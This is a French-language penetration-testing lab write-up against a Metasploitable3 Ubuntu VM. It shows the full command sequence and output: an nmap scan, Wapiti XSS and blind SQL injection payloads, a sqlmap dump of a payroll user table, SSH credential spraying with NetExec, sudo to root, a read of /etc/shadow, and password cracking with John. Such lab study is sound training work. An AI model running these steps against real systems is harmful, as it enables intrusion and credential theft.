1.Énumération

**<span style="color: #dddddd;">👁️</span> Nmap**

```
┌─[parrot@windows]─[~/Desktop]
└──╼ $nmap -sS -A -sC -p- -T5 --script vuln -v -oX 192.168.56.107-tcp.xml 192.168.56.107
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-06 12:24 GMT
NSE: Loaded 150 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 12:24
Completed NSE at 12:24, 10.02s elapsed
Initiating NSE at 12:24
Completed NSE at 12:24, 0.01s elapsed
Initiating ARP Ping Scan at 12:24
Scanning 192.168.56.107 [1 port]
Completed ARP Ping Scan at 12:24, 0.10s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:24
Completed Parallel DNS resolution of 1 host. at 12:24, 0.14s elapsed
Initiating SYN Stealth Scan at 12:24
Scanning 192.168.56.107 [65535 ports]
Discovered open port 3306/tcp on 192.168.56.107
Discovered open port 445/tcp on 192.168.56.107
Discovered open port 8080/tcp on 192.168.56.107
Discovered open port 21/tcp on 192.168.56.107
Discovered open port 22/tcp on 192.168.56.107
Discovered open port 80/tcp on 192.168.56.107
Discovered open port 631/tcp on 192.168.56.107
Discovered open port 3500/tcp on 192.168.56.107
Discovered open port 6697/tcp on 192.168.56.107
```

&nbsp;

Intéressant

![Capture du 2025-01-10 01-09-38.png](../../_resources/Capture%20du%202025-01-10%2001-09-38.png)

![Capture du 2025-01-10 01-09-52.png](../../_resources/Capture%20du%202025-01-10%2001-09-52.png)

**<span style="color: #dddddd;">🔥</span> Wapiti**

Essayons de trouver une vulnérabilité sur la page `payroll_app.php`

```
┌─[parrot@parrot]─[~]
└──╼ $wapiti -u http://192.168.56.21/payroll_app.php -v 1

     __      __               .__  __  .__________
    /  \    /  \_____  ______ |__|/  |_|__\_____  \
    \   \/\/   /\__  \ \____ \|  \   __\  | _(__  <
     \        /  / __ \|  |_> >  ||  | |  |/       \
      \__/\  /  (____  /   __/|__||__| |__/______  /
           \/        \/|__|                      \/
Wapiti-3.0.4 (wapiti.sourceforge.io)
[+] GET http://192.168.56.21/payroll_app.php (0)
[+] POST http://192.168.56.21/payroll_app.php (1)
    data: user=alice&password=Letm3in_&s=OK
[*] Enregistrement de l'état du scan, veuillez patienter...

 Note
========
Ce scan a été sauvé dans le fichier /home/parrot/.wapiti/scans/192.168.56.21_folder_692e8b3e.db
[*] Wapiti a trouvé 2 URLs et formulaires lors du scan
[*] Chargement des modules :
     backup, blindsql, brute_login_form, buster, cookieflags, crlf, csp, csrf, exec, file, htaccess, http_headers, methods, nikto, permanentxss, redirect, shellshock, sql, ssrf, wapp, xss, xxe

[*] Lancement du module csp
CSP n'est pas défini

[*] Lancement du module http_headers
Vérification de X-Frame-Options :
L'entête X-Frame-Options n'est pas défini
Vérification de X-XSS-Protection :
L'entête X-XSS-Protection n'est pas défini
Vérification de X-Content-Type-Options :
L'entête X-Content-Type-Options n'est pas défini
Vérification de Strict-Transport-Security :
L'entête Strict-Transport-Security n'est pas défini

[*] Lancement du module cookieflags

[*] Lancement du module exec
[+] GET http://192.168.56.21/payroll_app.php (0)
[+] POST http://192.168.56.21/payroll_app.php (1)
    data: user=alice&password=Letm3in_&s=OK

[*] Lancement du module file
[+] GET http://192.168.56.21/payroll_app.php (0)
[+] POST http://192.168.56.21/payroll_app.php (1)
    data: user=alice&password=Letm3in_&s=OK

[*] Lancement du module sql
[+] GET http://192.168.56.21/payroll_app.php (0)
[+] POST http://192.168.56.21/payroll_app.php (1)
    data: user=alice&password=Letm3in_&s=OK

[*] Lancement du module xss
[+] GET http://192.168.56.21/payroll_app.php (0)
[+] POST http://192.168.56.21/payroll_app.php (1)
    data: user=alice&password=Letm3in_&s=OK
---
Vulnérabilité XSS dans http://192.168.56.21/payroll_app.php via une injection dans le paramètre user
Evil request:
    POST /payroll_app.php HTTP/1.1
    Host: 192.168.56.21
    Referer: http://192.168.56.21/payroll_app.php
    Content-Type: application/x-www-form-urlencoded

    user=%3CScRiPt%3Ealert%28%22w1w8zlluzz%22%29%3C%2FsCrIpT%3E&password=Letm3in_&s=OK
---

[*] Lancement du module ssrf
[+] GET http://192.168.56.21/payroll_app.php (0)
[+] POST http://192.168.56.21/payroll_app.php (1)
    data: user=alice&password=Letm3in_&s=OK
[*] Requête du endpoint à l'URL https://wapiti3.ovh/get_ssrf.php?id=z960h6, en attente des résultats...

[*] Lancement du module redirect

[*] Lancement du module blindsql
[+] GET http://192.168.56.21/payroll_app.php (0)
[+] POST http://192.168.56.21/payroll_app.php (1)
    data: user=alice&password=Letm3in_&s=OK
---
Vulnérabilité d'injection SQL en aveugle dans http://192.168.56.21/payroll_app.php via une injection dans le paramètre user
Evil request:
    POST /payroll_app.php HTTP/1.1
    Host: 192.168.56.21
    Referer: http://192.168.56.21/payroll_app.php
    Content-Type: application/x-www-form-urlencoded

    user=%27+or+sleep%287%29%231&password=Letm3in_&s=OK
---
---
Vulnérabilité d'injection SQL en aveugle dans http://192.168.56.21/payroll_app.php via une injection dans le paramètre password
Evil request:
    POST /payroll_app.php HTTP/1.1
    Host: 192.168.56.21
    Referer: http://192.168.56.21/payroll_app.php
    Content-Type: application/x-www-form-urlencoded

    user=alice&password=%27+or+sleep%287%29%231&s=OK
---

[*] Lancement du module permanentxss
[+] http://192.168.56.21/payroll_app.php

```

&nbsp;

**<span style="color: #dddddd;">🕳️</span> Sqlmap**

Avec la vulnérabilité SQL trouver précédemment essayons de dumper la base `payroll`

```
┌─[parrot@parrot]─[~]
└──╼ $sqlmap -u http://192.168.56.21/payroll_app.php --data="user=alice&password=Letm3in_&s=OK" --dump
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.8.3#stable}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 01:10:52 /2025-01-10/

[01:10:52] [INFO] resuming back-end DBMS 'mysql' 
[01:10:52] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: user (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: user=alice' AND (SELECT 7133 FROM (SELECT(SLEEP(5)))xobX) AND 'Leyi'='Leyi&password=''or ''&s=OK

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: user=alice' UNION ALL SELECT NULL,NULL,CONCAT(0x7178707671,0x76756f535466486970684e656776524c474b72426e6a6a5645736a77576c70634d6f435743655161,0x71766b7671),NULL-- -&password=''or ''&s=OK

Parameter: password (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: user=alice&password=''or' AND (SELECT 4469 FROM (SELECT(SLEEP(5)))NRtS) AND 'PZZK'='PZZK ''&s=OK

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: user=alice&password=''or' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7178707671,0x474f566d4b6d664653796873455a7766765a4d5a66734a504343437966704f567a417656614d5173,0x71766b7671)-- - ''&s=OK
---
there were multiple injection points, please select the one to use for following injections:
[0] place: POST, parameter: user, type: Single quoted string (default)
[1] place: POST, parameter: password, type: Single quoted string
[q] Quit
> 1
[01:10:57] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.4.5
back-end DBMS: MySQL >= 5.0.12
[01:10:57] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[01:10:57] [INFO] fetching current database
[01:10:57] [INFO] fetching tables for database: 'payroll'
[01:10:57] [INFO] fetching columns for table 'users' in database 'payroll'
[01:10:57] [INFO] fetching entries for table 'users' in database 'payroll'
Database: payroll
Table: users
[15 entries]
+--------+-------------------------+------------------+------------+------------+
| salary | password                | username         | last_name  | first_name |
+--------+-------------------------+------------------+------------+------------+
| 9560   | help_me_obiwan          | leia_organa      | Organa     | Leia       |
| 1080   | like_my_father_beforeme | luke_skywalker   | Skywalker  | Luke       |
| 1200   | nerf_herder             | han_solo         | Solo       | Han        |
| 22222  | b00p_b33p               | artoo_detoo      | Detoo      | Artoo      |
| 3200   | Pr0t0c07                | c_three_pio      | Threepio   | C          |
| 10000  | thats_no_m00n           | ben_kenobi       | Kenobi     | Ben        |
| 6666   | Dark_syD3               | darth_vader      | Vader      | Darth      |
| 1025   | but_master:(            | anakin_skywalker | Skywalker  | Anakin     |
| 2048   | mesah_p@ssw0rd          | jarjar_binks     | Binks      | Jar-Jar    |
| 40000  | @dm1n1str8r             | lando_calrissian | Calrissian | Lando      |
| 20000  | mandalorian1            | boba_fett        | Fett       | Boba       |
| 65000  | my_kinda_skum           | jabba_hutt       | Hutt       | Jaba       |
| 50000  | hanSh0tF1rst            | greedo           | Rodian     | Greedo     |
| 4500   | rwaaaaawr8              | chewbacca        | <blank>    | Chewbacca  |
| 6667   | Daddy_Issues2           | kylo_ren         | Ren        | Kylo       |
+--------+-------------------------+------------------+------------+------------+

```

&nbsp;

**🖥️ NetExec**

Apres avoir trouver les `user` & `password` dans la base de donnée , essayons de tester en SSH

```
┌─[parrot@parrot]─[~]
└──╼ $nxc ssh 192.168.56.21 -u user -p pass --no-bruteforce --continue-on-success --sudo-check
SSH         192.168.56.21   22     192.168.56.21    [*] SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.13
SSH         192.168.56.21   22     192.168.56.21    [+] leia_organa:help_me_obiwan (Pwn3d!) Linux - Shell access!
SSH         192.168.56.21   22     192.168.56.21    [+] luke_skywalker:like_my_father_beforeme (Pwn3d!) Linux - Shell access!
SSH         192.168.56.21   22     192.168.56.21    [+] han_solo:nerf_herder (Pwn3d!) Linux - Shell access!
SSH         192.168.56.21   22     192.168.56.21    [+] artoo_detoo:b00p_b33p  Linux - Shell access!
SSH         192.168.56.21   22     192.168.56.21    [+] c_three_pio:Pr0t0c07  Linux - Shell access!
SSH         192.168.56.21   22     192.168.56.21    [+] ben_kenobi:thats_no_m00n  Linux - Shell access!
SSH         192.168.56.21   22     192.168.56.21    [-] darth_vader:Dark_syD3
SSH         192.168.56.21   22     192.168.56.21    [+] anakin_skywalker:but_master:(  Linux - Shell access!
SSH         192.168.56.21   22     192.168.56.21    [+] jarjar_binks:mesah_p@ssw0rd  Linux - Shell access!
SSH         192.168.56.21   22     192.168.56.21    [+] lando_calrissian:@dm1n1str8r  Linux - Shell access!
SSH         192.168.56.21   22     192.168.56.21    [+] boba_fett:mandalorian1  Linux - Shell access!
SSH         192.168.56.21   22     192.168.56.21    [+] jabba_hutt:my_kinda_skum  Linux - Shell access!
SSH         192.168.56.21   22     192.168.56.21    [+] greedo:hanSh0tF1rst  Linux - Shell access!
SSH         192.168.56.21   22     192.168.56.21    [+] chewbacca:rwaaaaawr8  Linux - Shell access!
SSH         192.168.56.21   22     192.168.56.21    [+] kylo_ren:Daddy_Issues2  Linux - Shell access!
```

&nbsp;

On va prendre le 1<sup>ier</sup> user tester pour se connecter en SSH et dump le fichier `shadow`

```
┌─[parrot@parrot]─[~]
└──╼ $ssh leia_organa@192.168.56.21
leia_organa@192.168.56.21's password: 
Welcome to Ubuntu 14.04.6 LTS (GNU/Linux 3.13.0-170-generic x86_64)

 * Documentation:  https://help.ubuntu.com/
Last login: Fri Jan 10 12:10:06 2025 from 192.168.56.104
leia_organa@metasploitable3-ub1404:~$ sudo -s
[sudo] password for leia_organa: 
root@metasploitable3-ub1404:~# cat /etc/shadow
root:!:18564:0:99999:7:::
daemon:*:16176:0:99999:7:::
bin:*:16176:0:99999:7:::
sys:*:16176:0:99999:7:::
sync:*:16176:0:99999:7:::
games:*:16176:0:99999:7:::
man:*:16176:0:99999:7:::
lp:*:16176:0:99999:7:::
mail:*:16176:0:99999:7:::
news:*:16176:0:99999:7:::
uucp:*:16176:0:99999:7:::
proxy:*:16176:0:99999:7:::
www-data:*:16176:0:99999:7:::
backup:*:16176:0:99999:7:::
list:*:16176:0:99999:7:::
irc:*:16176:0:99999:7:::
gnats:*:16176:0:99999:7:::
nobody:*:16176:0:99999:7:::
libuuid:!:16176:0:99999:7:::
syslog:*:16176:0:99999:7:::
messagebus:*:18564:0:99999:7:::
sshd:*:18564:0:99999:7:::
statd:*:18564:0:99999:7:::
vagrant:$6$NABMNgxO$T2lvEhArjOImjvROySq8vka/r8MWhhzNgT3Z5FS1LcPS5D325ESK5LjFJymb2jo/m4NmDg8aEl0TWWI3la.Y3/:18564:0:99999:7:::
dirmngr:*:18564:0:99999:7:::
leia_organa:$1$N6DIbGGZ$LpERCRfi8IXlNebhQuYLK/:18564:0:99999:7:::
luke_skywalker:$1$/7D55Ozb$Y/aKb.UNrDS2w7nZVq.Ll/:18564:0:99999:7:::
han_solo:$1$6jIF3qTC$7jEXfQsNENuWYeO6cK7m1.:18564:0:99999:7:::
artoo_detoo:$1$tfvzyRnv$mawnXAR4GgABt8rtn7Dfv.:18564:0:99999:7:::
c_three_pio:$1$lXx7tKuo$xuM4AxkByTUD78BaJdYdG.:18564:0:99999:7:::
ben_kenobi:$1$5nfRD/bA$y7ZZD0NimJTbX9FtvhHJX1:18564:0:99999:7:::
darth_vader:$1$rLuMkR1R$YHumHRxhswnfO7eTUUfHJ.:18564:0:99999:7:::
anakin_skywalker:$1$jlpeszLc$PW4IPiuLTwiSH5YaTlRaB0:18564:0:99999:7:::
jarjar_binks:$1$SNokFi0c$F.SvjZQjYRSuoBuobRWMh1:18564:0:99999:7:::
lando_calrissian:$1$Af1ek3xT$nKc8jkJ30gMQWeW/6.ono0:18564:0:99999:7:::
boba_fett:$1$TjxlmV4j$k/rG1vb4.pj.z0yFWJ.ZD0:18564:0:99999:7:::
jabba_hutt:$1$9rpNcs3v$//v2ltj5MYhfUOHYVAzjD/:18564:0:99999:7:::
greedo:$1$vOU.f3Tj$tsgBZJbBS4JwtchsRUW0a1:18564:0:99999:7:::
chewbacca:$1$.qt4t8zH$RdKbdafuqc7rYiDXSoQCI.:18564:0:99999:7:::
kylo_ren:$1$rpvxsssI$hOBC/qL92d0GgmD/uSELx.:18564:0:99999:7:::
mysql:!:18564:0:99999:7:::
avahi:*:18564:0:99999:7:::
colord:*:18564:0:99999:7:::

```

&nbsp;

**🧨 JohnTheRipper**

Crack du hash de utilisateur `vagrant`

```bash
┌─[parrot@parrot]─[~]
└──╼ $john hash 
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
vagrant          (vagrant)     
1g 0:00:00:00 DONE 1/3 (2025-01-10 13:22) 20.00g/s 160.0p/s 160.0c/s 160.0C/s vagrant..vagran
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
┌─[parrot@parrot]─[~]
└──╼ $john --show hash
vagrant:vagrant:18564:0:9999

1 password hash cracked, 1 left

```

&nbsp;

Cred trouver

| **User** | **Password** |
| --- | --- |
| vagrant | vagrant |
| leia_organa | help_me_obiwan |
| luke_skywalker | like_my_father_beforeme |
| han_solo | nerf_herder |
| artoo_detoo | b00p_b33p |
| c_three_pio | Pr0t0c07 |
| ben_kenobi | thats_no_m00n |
| darth_vader | Dark_syD3 |
| anakin_skywalker | but_master:( |
| jarjar_binks | mesah_p@ssw0rd |
| lando_calrissian | @dm1n1str8r |
| boba_fett | mandalorian1 |
| jabba_hutt | my_kinda_skum |
| greedo | hanSh0tF1rst |
| chewbacca | rwaaaaawr8 |
| kylo_ren | Daddy_Issues2 |
